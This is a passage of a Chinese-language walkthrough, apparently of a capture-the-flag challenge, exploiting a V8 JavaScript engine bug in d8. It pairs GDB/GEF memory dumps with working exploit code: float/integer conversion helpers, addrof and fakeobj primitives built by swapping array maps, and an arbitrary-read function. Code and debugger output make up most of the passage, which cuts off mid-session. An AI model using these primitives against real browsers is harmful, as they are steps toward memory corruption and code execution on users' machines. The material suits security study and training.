law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from ./d8...<span class="keyword">done</span>.</span><br><span class="line">gef➤  r --allow-natives-syntax</span><br><span class="line">Starting program: /root/v8build/v8/out.gn/x64.debug/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff260f700 (LWP 6077)]</span><br><span class="line">[New Thread 0x7ffff1e0e700 (LWP 6078)]</span><br><span class="line">[New Thread 0x7ffff160d700 (LWP 6079)]</span><br><span class="line">V8 version 8.5.0 (candidate)</span><br><span class="line">d8&gt; var arr = [1.1, 2.2, 3.3];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(arr)</span><br><span class="line">DebugPrint: 0x1201080c5e45: [JSArray]</span><br><span class="line"> - map: 0x120108281909 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x12010824923d &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1201080c5e25 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1201080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x1201081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1201080c5e25 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">0x120108281909: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x1201082818e1 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x1201081c0451 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x120108249911 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x12010824995d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x120108042f3d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x120108281931 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x12010824923d &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x120108249111 &lt;JSFunction Array (sfi = 0x1201081cc41d)&gt;</span><br><span class="line"> - dependent code: 0x1201080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">[1.1, 2.2, 3.3]</span><br></pre></td></tr></table></figure>
+
+<p>分解,现在有arr位于0x1201080c5e45 JSArray类型的,它的map位于0x120108281909,除此之外,根据这些信息,它有一个map的PACKED_DOUBLE_ELEMENTS arr引用有两类型的元素。元素指针位于0x1201080c5e25，长度为3，类型为FixedDoubleArray。现在，使用gdb检查arr周围的内存内容。</p>
+<ul>
+<li>为了检查地址的内存内容，需要从地址中减去1，这样就得到了用于分析的绝对地址。</li>
+</ul>
+<figure class="highlight bash" data-code="Z2Vm4p6kICB4LzR3eCAweDEyMDEwODBjNWU0NSAtIDEKMHgxMjAxMDgwYzVlNDQ6CTB4MDgyODE5MDkgPC0tLS0tIE1hcCAweDA4MDQwNmU5IDwtLS0tIFByb3BlcnRpZXMgMHgwODBjNWUyNSA8LS0tLS0gRWxlbWVudCBBcnJheSAweDAwMDAwMDA2Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/4wx 0x1201080c5e45 - 1</span><br><span class="line">0x1201080c5e44:	0x08281909 &lt;----- Map 0x080406e9 &lt;---- Properties 0x080c5e25 &lt;----- Element Array 0x00000006</span><br></pre></td></tr></table></figure>
+
+<p>从调试信息(使用%DebugPrint(arr))和gdb输出中，可以看到第一个元素属于数组本身的映射，第二个属于属性，第三个属于元素数组。如果你注意,使用了x&#x2F;wx地址显示为32位表示,这里是,提交的版本的V8引擎集成后指针压缩,使1是地址的32位整数。</p>
+<figure class="highlight bash" data-code="Z2Vm4p6kICB4LzV4ZyAweDEyMDEwODBjNWUyNSAtIDEKMHgxMjAxMDgwYzVlMjQ6CTB4MDAwMDAwMDYwODA0MGEzZAkweDNmZjE5OTk5OTk5OTk5OWEKMHgxMjAxMDgwYzVlMzQ6CTB4NDAwMTk5OTk5OTk5OTk5YQkweDQwMGE2NjY2NjY2NjY2NjYKMHgxMjAxMDgwYzVlNDQ6CTB4MDgwNDA2ZTkwODI4MTkwOQpnZWbinqQgIHAvZCAweDNmZjE5OTk5OTk5OTk5OWEKJDIgPSA0NjA3NjMyNzc4NzYyNzU0NDU4CmdlZuKepCAgcC9mIDB4M2ZmMTk5OTk5OTk5OTk5YQokMyA9IDEuMTAwMDAwMDAwMDAwMDAwMQpnZWbinqQgIHAvZiAweDQwMDE5OTk5OTk5OTk5OWEKJDQgPSAyLjIwMDAwMDAwMDAwMDAwMDIK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/5xg 0x1201080c5e25 - 1</span><br><span class="line">0x1201080c5e24:	0x0000000608040a3d	0x3ff199999999999a</span><br><span class="line">0x1201080c5e34:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x1201080c5e44:	0x080406e908281909</span><br><span class="line">gef➤  p/d 0x3ff199999999999a</span><br><span class="line"><span class="variable">$2</span> = 4607632778762754458</span><br><span class="line">gef➤  p/f 0x3ff199999999999a</span><br><span class="line"><span class="variable">$3</span> = 1.1000000000000001</span><br><span class="line">gef➤  p/f 0x400199999999999a</span><br><span class="line"><span class="variable">$4</span> = 2.2000000000000002</span><br></pre></td></tr></table></figure>
+
+<p>现在，因为知道了一个数组是如何表示到V8堆中的，也知道有一个读写漏洞，得出结论，有能力覆盖对象的映射。记住这一点，继续:</p>
+<p>首先，需要使实用函数能够处理指针标记并将浮点值更改为小数，反之亦然。下面的JavaScript函数将完成上述工作:</p>
+<figure class="highlight bash" data-code="dmFyIGJ1ZiA9IG5ldyBBcnJheUJ1ZmZlcig4KTsgLy8gOCBieXRlIGFycmF5IGJ1ZmZlcgp2YXIgZjY0X2J1ZiA9IG5ldyBGbG9hdDY0QXJyYXkoYnVmKTsKdmFyIHU2NF9idWYgPSBuZXcgVWludDMyQXJyYXkoYnVmKTsKCmZ1bmN0aW9uIGZ0b2kodmFsLCBzaXplKSB7CgogICAgZjY0X2J1ZlswXSA9IHZhbDsKCiAgICBpZihzaXplID09IDMyKSB7CiAgICAgICAgcmV0dXJuIEJpZ0ludCh1NjRfYnVmWzBdKTsKICAgIH0gZWxzZSBpZihzaXplID09IDY0KSB7CiAgICAgICAgcmV0dXJuIEJpZ0ludCh1NjRfYnVmWzBdKSArIChCaWdJbnQodTY0X2J1ZlsxXSkgPDwgMzJuKTsKICAgIH0KCn0KCmZ1bmN0aW9uIGl0b2YodmFsLCBzaXplKSB7CgogICAgaWYoc2l6ZSA9PSAzMikgewogICAgICAgIHU2NF9idWZbMF0gPSBOdW1iZXIodmFsICYgMHhmZmZmZmZmZm4pOwogICAgfSBlbHNlIGlmKHNpemUgPT0gNjQpIHsKICAgICAgICB1NjRfYnVmWzBdID0gTnVtYmVyKHZhbCAmIDB4ZmZmZmZmZmZuKTsKICAgICAgICB1NjRfYnVmWzFdID0gTnVtYmVyKHZhbCA+PiAzMm4pOwogICAgfQoKICAgIHJldHVybiBmNjRfYnVmWzBdOwoKfQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(8); // 8 byte array buffer</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ftoi(val, size) &#123;</span><br><span class="line"></span><br><span class="line">    f64_buf[0] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == 32) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(size == 64) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; <span class="string">32n);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function itof(val, size) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(size == 32) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">    &#125; else if(size == 64) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">        u64_buf[1] = Number(val &gt;&gt; 32n</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> f64_buf[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述函数用于将浮点数转换为整数，将整数转换为浮点数，因为内存地址将被它们所尊重的值覆盖为浮点数，所以需要它们。</p>
+<p>继续，需要创建一些浮点数组，为了获得所需的泄漏，还需要它们来执行fakeobj和addrof原语，废话不多说，开始:</p>
+<figure class="highlight bash" data-code="dmFyIGZsb2F0X2FyciA9IFsxLjEsIDIuMiwgMy4zLCA0LjQsIDUuNV07CnZhciBvYmogPSB7IkEiOjEuMX07CnZhciByZWcgPSBbMSwgMiwgMywgNF07Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">var obj = &#123;<span class="string">&quot;A&quot;</span>:1.1&#125;;</span><br><span class="line">var reg = [1, 2, 3, 4];</span><br></pre></td></tr></table></figure>
+
+<p>这些变量将进一步涉及到利用，接下来，需要得到addrof原语，这意味着需要利用off来读取对象的地址，看看:</p>
+<figure class="highlight bash" data-code="dmFyIGZsb2F0X2Fycl9tYXAgPSBmdG9pKGZsb2F0X2Fyci5HZXRMYXN0RWxlbWVudCgpLCAzMikKdmFyIHJlZ19hcnJfbWFwID0gZmxvYXRfYXJyX21hcCAtIDB4YTBuOwoKY29uc29sZS5sb2coIlsqXSBGbG9hdCBhcnJheSBtYXAgICA6ICAweCIgKyBmbG9hdF9hcnJfbWFwLnRvU3RyaW5nKDE2KSk7CmNvbnNvbGUubG9nKCJbKl0gUmVndWxhciBhcnJheSBtYXAgOiAgMHgiICsgcmVnX2Fycl9tYXAudG9TdHJpbmcoMTYpKTsKCgpmdW5jdGlvbiBhZGRyb2YoaW5fb2JqKSB7CiAgICBmbG9hdF9hcnIuU2V0TGFzdEVsZW1lbnQoaXRvZihyZWdfYXJyX21hcCwgMzIpKTsKICAgIGZsb2F0X2FyclswXSA9IGluX29iajsKICAgIGZsb2F0X2Fyci5TZXRMYXN0RWxlbWVudChpdG9mKGZsb2F0X2Fycl9tYXAsIDMyKSk7CiAgICBsZXQgYWRkciA9IGZsb2F0X2FyclswXTsKICAgIHJldHVybiBmdG9pKGFkZHIsIDY0KQp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var float_arr_map = ftoi(float_arr.GetLastElement(), 32)</span><br><span class="line">var reg_arr_map = float_arr_map - 0xa0n;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] Float array map   :  0x&quot;</span> + float_arr_map.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[*] Regular array map :  0x&quot;</span> + reg_arr_map.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addrof(in_obj) &#123;</span><br><span class="line">    float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">    float_arr[0] = in_obj;</span><br><span class="line">    float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">    <span class="built_in">let</span> addr = float_arr[0];</span><br><span class="line">    <span class="built_in">return</span> ftoi(addr, 64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里,首先得到float_arr的map地址和reg数组,然后有一个函数叫做addrof,这需要一个对象将对象地址需要的地址作为参数,要做的是首先用reg数组覆盖float_arr映射的map对象,这意味着,到目前为止,float_arr指向的地址映射reg数组,然后使float_arr的对象需要的地址作为第一个对象,然后将float_arr的映射放回到它原来的位置。</p>
+<p>考虑到，有一个map泄漏，如果试图读取存储在该地址的内容，它将导致:</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb165.jpg"></li>
+</ul>
+<p>随着v8 利用的进行，需要一个fakeobj原语。fakeobj函数如下:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZmFrZW9iaihhZGRyKSB7CiAgICBmbG9hdF9hcnJbMF0gPSBpdG9mKGFkZHIsIDMyKTsKICAgIGZsb2F0X2Fyci5TZXRMYXN0RWxlbWVudChpdG9mKHJlZ19hcnJfbWFwLCAzMikpOwogICAgbGV0IGZha2UgPSBmbG9hdF9hcnJbMF07CiAgICBmbG9hdF9hcnIuU2V0TGFzdEVsZW1lbnQoaXRvZihmbG9hdF9hcnJfbWFwLCAzMikpOwogICAgcmV0dXJuIGZha2U7Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> fakeobj(addr) &#123;</span><br><span class="line">    float_arr[0] = itof(addr, 32);</span><br><span class="line">    float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">    <span class="built_in">let</span> fake = float_arr[0];</span><br><span class="line">    float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">    <span class="built_in">return</span> fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来谈谈fakeobj函数,这种原始的,在这个漏洞和特定的上下文中,把假的对象的地址,想把它放置到float_arr的第一个元素,然后改变了float_arr map到reg数组的map,所以往往从第0个索引来访问数据,其工作原理是:</p>
+<ul>
+<li><p><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb166.jpg"></p>
+</li>
+<li><p>把想要覆盖另一个对象的对象地址覆盖</p>
+</li>
+<li><p>将float_arr的映射设置为reg的映射</p>
+</li>
+<li><p>从float_arr中获取假对象</p>
+</li>
+<li><p>把float_arr的map放回原来的位置</p>
+</li>
+</ul>
+<p>这些原语是在进入读&#x2F;写原语之前需要的，不过有了这些原语，现在可以处理函数arb_read和arb_write，这两个函数分别用于从一个地址的值中读地址或从一个地址的值中写地址。</p>
+<p>继续，对任意读函数感兴趣，将尽力解释，目前，考虑下面的函数，它用于从任意地址读取值:</p>
+<figure class="highlight bash" data-code="dmFyIHJ3X2hlbHBlciA9IFtpdG9mKGZsb2F0X2Fycl9tYXAsIDY0KSwgMS4xLCAyLjIsIDMuM107CnZhciByd19oZWxwZXJfYWRkciA9IGFkZHJvZihyd19oZWxwZXIpICYgMHhmZmZmZmZmZm47Cgpjb25zb2xlLmxvZygiWytdIENvbnRyb2xsZWQgUlcgaGVscGVyIGFkZHJlc3M6IDB4IiArIHJ3X2hlbHBlcl9hZGRyLnRvU3RyaW5nKDE2KSk7CgpmdW5jdGlvbiBhcmJfcmVhZChhZGRyKSB7CiAgICBsZXQgZmFrZSA9IGZha2VvYmoocndfaGVscGVyX2FkZHIgLSAweDIwbik7CiAgICByd19oZWxwZXJbMV0gPSBpdG9mKCgweDhuIDw8IDMybikgKyBhZGRyIC0gMHg4biwgNjQpOwogICAgcmV0dXJuIGZ0b2koZmFrZVswXSwgNjQpOwp9Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];</span><br><span class="line">var rw_helper_addr = addrof(rw_helper) &amp; 0xffffffffn;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Controlled RW helper address: 0x&quot;</span> + rw_helper_addr.toString(16));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> arb_read(addr) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    return ftoi(fake[<span class="number">0</span>], <span class="number">64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一这个函数是通过fakeobj函数制造一个假的对象,然后把想读的地址,写rw_helper数组的第一个指数,然后第一个元素假的对象是错误的,这是函数的跟进,导致整个逻辑的理解，d8二进制解释步骤:</p>
+<p>使用rw_helper的地址创建fakeobj，从中减去0x20，因为32个字节是用于内存布局的，在本例中，这样做是因为:</p>
+<figure class="highlight bash" data-code="cm9vdEBsdWNpOn4vdjhidWlsZC92OC9vdXQuZ24veDY0LnJlbGVhc2UjIGdkYiAuL2Q4CkdOVSBnZGIgKFVidW50dSA3LjExLjEtMHVidW50dTF+MTYuNSkgNy4xMS4xCkNvcHlyaWdodCAoQykgMjAxNiBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4KTGljZW5zZSBHUEx2Mys6IEdOVSBHUEwgdmVyc2lvbiAzIG9yIGxhdGVyIDxodHRwOi8vZ251Lm9yZy9saWNlbnNlcy9ncGwuaHRtbD4KVGhpcyBpcyBmcmVlIHNvZnR3YXJlOiB5b3UgYXJlIGZyZWUgdG8gY2hhbmdlIGFuZCByZWRpc3RyaWJ1dGUgaXQuClRoZXJlIGlzIE5PIFdBUlJBTlRZLCB0byB0aGUgZXh0ZW50IHBlcm1pdHRlZCBieSBsYXcuICBUeXBlICJzaG93IGNvcHlpbmciCmFuZCAic2hvdyB3YXJyYW50eSIgZm9yIGRldGFpbHMuClRoaXMgR0RCIHdhcyBjb25maWd1cmVkIGFzICJ4ODZfNjQtbGludXgtZ251Ii4KVHlwZSAic2hvdyBjb25maWd1cmF0aW9uIiBmb3IgY29uZmlndXJhdGlvbiBkZXRhaWxzLgpGb3IgYnVnIHJlcG9ydGluZyBpbnN0cnVjdGlvbnMsIHBsZWFzZSBzZWU6CjxodHRwOi8vd3d3LmdudS5vcmcvc29mdHdhcmUvZ2RiL2J1Z3MvPi4KRmluZCB0aGUgR0RCIG1hbnVhbCBhbmQgb3RoZXIgZG9jdW1lbnRhdGlvbiByZXNvdXJjZXMgb25saW5lIGF0Ogo8aHR0cDovL3d3dy5nbnUub3JnL3NvZnR3YXJlL2dkYi9kb2N1bWVudGF0aW9uLz4uCkZvciBoZWxwLCB0eXBlICJoZWxwIi4KVHlwZSAiYXByb3BvcyB3b3JkIiB0byBzZWFyY2ggZm9yIGNvbW1hbmRzIHJlbGF0ZWQgdG8gIndvcmQiLi4uCkdFRiBmb3IgbGludXggcmVhZHksIHR5cGUgYGdlZicgdG8gc3RhcnQsIGBnZWYgY29uZmlnJyB0byBjb25maWd1cmUKNzkgY29tbWFuZHMgbG9hZGVkIGZvciBHREIgNy4xMS4xIHVzaW5nIFB5dGhvbiBlbmdpbmUgMy41ClsqXSAxIGNvbW1hbmQgY291bGQgbm90IGJlIGxvYWRlZCwgcnVuIGBnZWYgbWlzc2luZ2AgdG8ga25vdyB3aHkuClJlYWRpbmcgc3ltYm9scyBmcm9tIC4vZDguLi4obm8gZGVidWdnaW5nIHN5bWJvbHMgZm91bmQpLi4uZG9uZS4KZ2Vm4p6kICBydW4gLS1hbGxvdy1uYXRpdmVzLXN5bnRheCAtLXNoZWxsIC9yb290L3Y4YnVpbGQvcm9wZTIveHBsLmpzClN0YXJ0aW5nIHByb2dyYW06IC9yb290L3Y4YnVpbGQvdjgvb3V0LmduL3g2NC5yZWxlYXNlL2Q4IC0tYWxsb3ctbmF0aXZlcy1zeW50YXggLS1zaGVsbCAvcm9vdC92OGJ1aWxkL3JvcGUyL3hwbC5qcwpbVGhyZWFkIGRlYnVnZ2luZyB1c2luZyBsaWJ0aHJlYWRfZGIgZW5hYmxlZF0KVXNpbmcgaG9zdCBsaWJ0aHJlYWRfZGIgbGlicmFyeSAiL2xpYi94ODZfNjQtbGludXgtZ251L2xpYnRocmVhZF9kYi5zby4xIi4KW05ldyBUaHJlYWQgMHg3ZmZmZjY2YzQ3MDAgKExXUCA5NTI4KV0KW05ldyBUaHJlYWQgMHg3ZmZmZjVlYzM3MDAgKExXUCA5NTI5KV0KW05ldyBUaHJlYWQgMHg3ZmZmZjU2YzI3MDAgKExXUCA5NTMwKV0KWypdIEZsb2F0IGFycmF5IG1hcCAgIDogIDB4ODI0MTkwOQpbKl0gUmVndWxhciBhcnJheSBtYXAgOiAgMHg4MjQxODY5ClsrXSBDb250cm9sbGVkIFJXIGhlbHBlciBhZGRyZXNzOiAweDgwODZiMjEKVjggdmVyc2lvbiA4LjUuMCAoY2FuZGlkYXRlKQpkOD4gJURlYnVnUHJpbnQocndfaGVscGVyKTsKMHgwNmE5MDgwODZiMjEgPEpTQXJyYXlbNF0+Cls2Ljc0ODExODJlLTMxNiwgMS4xLCAyLjIsIDMuM10KZDg+IF5DCmdlZuKepCAgeC8xMHhnIDB4MDZhOTA4MDg2YjIxIC0gMSAtIDB4MzAKMHg2YTkwODA4NmFmMDoJMHgwMDAwMzkzNjM4MzEzNDMyCTB4MDAwMDAwMDgwODA0MGEzZAoweDZhOTA4MDg2YjAwOgkweDAwMDAwMDAwMDgyNDE5MDkJMHgzZmYxOTk5OTk5OTk5OTlhCjB4NmE5MDgwODZiMTA6CTB4NDAwMTk5OTk5OTk5OTk5YQkweDQwMGE2NjY2NjY2NjY2NjYKMHg2YTkwODA4NmIyMDoJMHgwODA0MDZlOTA4MjQxOTA5CTB4MDAwMDAwMDgwODA4NmFmOQoweDZhOTA4MDg2YjMwOgkweDAwMDAwMDAyMDgwNDA5NzUJMHgwMDAwMDAwMDA4MjQxOTA5CmdlZuKepCAgeC8xMHhnIDB4MDZhOTA4MDg2YjIxIC0gMSAtIDB4MjAKMHg2YTkwODA4NmIwMDoJMHgwMDAwMDAwMDA4MjQxOTA5CTB4M2ZmMTk5OTk5OTk5OTk5YQoweDZhOTA4MDg2YjEwOgkweDQwMDE5OTk5OTk5OTk5OWEJMHg0MDBhNjY2NjY2NjY2NjY2CjB4NmE5MDgwODZiMjA6CTB4MDgwNDA2ZTkwODI0MTkwOQkweDAwMDAwMDA4MDgwODZhZjkKMHg2YTkwODA4NmIzMDoJMHgwMDAwMDAwMjA4MDQwOTc1CTB4MDAwMDAwMDAwODI0MTkwOQoweDZhOTA4MDg2YjQwOgkweDAwMDAwMDAwMDgwNDA5NzUJMHgwMDAwMDAwMDA4MDQwMjQ1CmdlZuKepCAgcCAweDA2YTkwODA4NmIyMSAtIDB4MjAKJDIgPSAweDZhOTA4MDg2YjAxCmdlZuKepCAgcCAweDA2YTkwODA4NmIyMSAtIDB4MjAgLSAxCiQzID0gMHg2YTkwODA4NmIwMAoK5aaC5p6c5Zyo5Zyw5Z2A4oCYMHg2YTkwODA4NmIwMOKAmeWkhOaUvue9ruS4gOS4quWBh+Wvueixoe+8jOWwseiDveWkn+iuv+mXrue0ouW8lTHvvIzkuZ/lsLHmmK/igJgweDZhOTA4MDg2YjEw4oCZ44CC6L+Z5qC377yM55Sf5oiQ55qE5YGH5a+56LGh5bCG5oyH5ZCR5oOz6KaB55qE5Zyw5Z2A55qE5YC844CCCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.release<span class="comment"># gdb ./d8</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know 